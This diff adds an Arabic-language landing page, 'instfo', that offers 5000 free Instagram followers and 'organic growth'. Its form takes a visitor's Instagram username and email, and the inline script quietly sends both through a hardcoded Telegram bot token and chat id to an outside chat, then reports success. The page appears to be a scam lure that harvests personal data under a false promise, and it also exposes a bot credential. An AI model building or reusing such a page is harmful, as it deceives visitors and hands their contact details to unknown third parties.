@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>instfo | زيادة متابعين انستقرام</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Cairo', Arial, sans-serif;
+            background: linear-gradient(135deg, #f6d365 0%, #fda085 100%);
+        }
+        .card {
+            transition: all 0.3s ease-in-out;
+        }
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+        .gradient-text {
+            background: linear-gradient(to right, #8A4FFF, #5D3FD3);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center py-12">
+    <div class="container mx-auto px-4">
+        <div class="max-w-4xl mx-auto">
+            <header class="text-center mb-12">
+                <h1 class="text-5xl font-bold gradient-text mb-4">instfo</h1>
+                <p class="text-2xl text-white font-semibold shadow-lg">زيادة متابعين انستقرام بذكاء</p>
+            </header>
+
+            <div class="bg-white bg-opacity-90 rounded-2xl p-6 mb-8 shadow-2xl">
+                <div class="flex items-center justify-center mb-4">
+                    <div class="w-24 h-1 bg-purple-500 rounded-full"></div>
+                </div>
+                <p class="text-center text-lg text-gray-700 font-medium">
+                    🎉 عرض مميز: 5000 متابع مجاني للمرة الأولى فقط! 🚀
+                </p>
+            </div>
+
+            <div class="grid md:grid-cols-2 gap-8">
+                <div class="card bg-white p-8 rounded-2xl shadow-xl hover:shadow-2xl">
+                    <h2 class="text-2xl font-semibold mb-6 text-center gradient-text">لماذا instfo؟</h2>
+                    <ul class="space-y-4">
+                        <li class="flex items-center bg-purple-50 p-3 rounded-lg">
+                            <svg class="w-6 h-6 text-purple-500 ml-3" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
+                            </svg>
+                            <span>نمو عضوي 100٪</span>
+                        </li>
+                        <li class="flex items-center bg-purple-50 p-3 rounded-lg">
+                            <svg class="w-6 h-6 text-purple-500 ml-3" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
+                            </svg>
+                            <span>استهداف دقيق للجمهور</span>
+                        </li>
+                        <li class="flex items-center bg-purple-50 p-3 rounded-lg">
+                            <svg class="w-6 h-6 text-purple-500 ml-3" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
+                            </svg>
+                            <span>تحليلات متقدمة</span>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="card bg-white p-8 rounded-2xl shadow-xl hover:shadow-2xl">
+                    <h2 class="text-2xl font-semibold mb-6 text-center gradient-text">احصل على 5000 متابع مجاناً</h2>
+                    <form id="followerForm" class="space-y-4">
+                        <input id="instagramUsername" type="text" placeholder="اسم مستخدم انستقرام" class="w-full p-3 border-2 border-purple-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500" required>
+                        <input id="userEmail" type="email" placeholder="بريدك الإلكتروني" class="w-full p-3 border-2 border-purple-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500" required>
+                        <button type="submit" class="w-full bg-gradient-to-r from-purple-600 to-pink-500 text-white p-3 rounded-lg hover:from-purple-700 hover:to-pink-600 transition-all duration-300">
+                            احصل على 5000 متابع مجاناً
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+            <footer class="text-center mt-12 text-white">
+                <p class="font-medium">© 2024 instfo. جميع الحقوق محفوظة</p>
+            </footer>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('followerForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // تفاصيل بوت التليجرام
+            const botToken = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
+            const chatId = '6185375878';
+            
+            // جمع المعلومات من الحقول
+            const instagramUsername = document.getElementById('instagramUsername').value;
+            const userEmail = document.getElementById('userEmail').value;
+            
+            // تنسيق الرسالة
+            const message = `
+📱 طلب جديد من instfo 📱
+
+Instagram: @${instagramUsername}
+Email: ${userEmail}
+
+#new_follower_request
+            `;
+
+            // إرسال الرسالة إلى Telegram
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(telegramUrl, { method: 'GET' })
+                .then(response => {
+                    alert('تم إرسال طلبك بنجاح! سنتواصل معك قريباً');
+                    // مسح الحقول بعد الإرسال
+                    document.getElementById('instagramUsername').value = '';
+                    document.getElementById('userEmail').value = '';
+                })
+                .catch(error => {
+                    alert('حدث خطأ. يرجى المحاولة مرة أخرى');
+                    console.error('Error:', error);
+                });
+        });
+    </script>
+</body>
+</html>
